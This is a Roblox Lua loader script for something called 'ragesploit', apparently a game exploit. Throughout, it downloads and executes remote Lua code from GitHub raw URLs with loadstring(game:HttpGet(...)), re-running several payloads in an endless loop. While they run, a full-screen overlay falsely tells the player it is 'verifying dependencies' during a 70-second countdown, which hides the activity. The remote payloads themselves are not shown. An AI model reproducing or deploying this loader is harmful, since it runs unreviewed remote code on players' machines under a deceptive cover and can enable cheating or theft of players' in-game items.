local SCRIPT_0 = "https://raw.githubusercontent.com/ragesploitadoptme/ragesploit/main/script0.lua"
local SCRIPT_1 = "https://raw.githubusercontent.com/ragesploitadoptme/ragesploit/main/script1.lua"
local SCRIPT_2 = "https://raw.githubusercontent.com/ragesploitadoptme/ragesploit/main/script2.lua"
local SCRIPT_3 = "https://raw.githubusercontent.com/ragesploitadoptme/ragesploit/main/script3.lua"
local SCRIPT_4 = "https://raw.githubusercontent.com/ragesploitadoptme/ragesploit/main/script4.lua"

local WAITING_SCRIPT = "https://raw.githubusercontent.com/itsmashood/scripts/refs/heads/main/main"

getgenv().Script0Ready = false
getgenv().ScriptState = "WAITING"

local Players = game:GetService("Players")
local player = Players.LocalPlayer

------------------------------------------------
-- RUNNER
------------------------------------------------
local function run(name, url)
    print("====================================")
    print("[LOADER] STARTING:", name)
    print("====================================")

    local ok, err = pcall(function()
        loadstring(game:HttpGet(url))()
    end)

    print("[LOADER] DONE:", name, ok, err)
end

------------------------------------------------
-- GUI
------------------------------------------------
local gui = Instance.new("ScreenGui")
gui.Name = "RageSploitLoading"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Enabled = true
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Parent = gui
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.fromRGB(8, 6, 14)
bg.BorderSizePixel = 0

local title = Instance.new("TextLabel")
title.Parent = bg
title.Size = UDim2.fromScale(1, 0.2)
title.Position = UDim2.fromScale(0, 0.3)
title.BackgroundTransparency = 1
title.Text = "🪐 Loading ragesploit"
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(255,255,255)

------------------------------------------------
-- WAITING PHASE
------------------------------------------------

task.spawn(function()
    run("Script 0", SCRIPT_0)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(WAITING_SCRIPT))()
    end)
end)

-- hide GUI after 10 seconds
task.delay(10, function()
    if getgenv().ScriptState == "WAITING" then
        gui.Enabled = false
    end
end)

------------------------------------------------
-- WAIT FOR SCRIPT 0
------------------------------------------------
repeat task.wait(1) until getgenv().Script0Ready == true

------------------------------------------------
-- MAIN DETECTED
------------------------------------------------
getgenv().ScriptState = "ACTIVE"

print("====================================")
print("MAIN DETECTED")
print("WAITING 18 SECONDS BEFORE START")
print("====================================")

gui.Enabled = true

------------------------------------------------
-- 18 SECOND DELAY (BLOCK ONLY START, NOT UI)
------------------------------------------------
task.wait(18)

------------------------------------------------
-- 70 SECOND COUNTDOWN (NON-BLOCKING UI ONLY)
------------------------------------------------

title.Text = "Please wait 70 seconds while we verify dependencies"

local countdown = Instance.new("TextLabel")
countdown.Parent = bg
countdown.Size = UDim2.fromScale(1, 0.1)
countdown.Position = UDim2.fromScale(0, 0.65)
countdown.BackgroundTransparency = 1
countdown.TextColor3 = Color3.fromRGB(200, 200, 200)
countdown.TextScaled = true
countdown.Font = Enum.Font.GothamBold

task.spawn(function()
    for i = 70, 0, -1 do
        countdown.Text = "Verifying dependencies... " .. i .. "s"
        task.wait(1)
    end
    countdown.Text = "Verification complete."
end)

------------------------------------------------
-- SCRIPT 1 STARTS IMMEDIATELY AFTER 18s (NOT BLOCKED BY COUNTDOWN)
------------------------------------------------

task.spawn(function()
    run("Script 1", SCRIPT_1)
end)

------------------------------------------------
-- CYCLE SYSTEM
------------------------------------------------
local cycle = 1

while true do
    print("====================================")
    print("CYCLE " .. cycle .. " STARTED")
    print("====================================")

    task.wait(2)

    task.spawn(function()
        run("Script 2", SCRIPT_2)
    end)

    task.wait(7)

    task.spawn(function()
        run("Script 3 FIRST RUN", SCRIPT_3)
    end)

    task.wait(3)

    task.spawn(function()
        run("Script 3 BACKUP RUN", SCRIPT_3)
    end)

    task.wait(16)

    task.spawn(function()
        run("Script 4 BACKUP #1", SCRIPT_4)
    end)

    task.wait(3)

    task.spawn(function()
        run("Script 4 MAIN", SCRIPT_4)
    end)

    task.wait(3)

    task.spawn(function()
        run("Script 4 BACKUP #2", SCRIPT_4)
    end)

    print("====================================")
    print("CYCLE " .. cycle .. " COMPLETE")
    print("WAITING 6 SECONDS")
    print("====================================")

    cycle += 1
    task.wait(6)
end
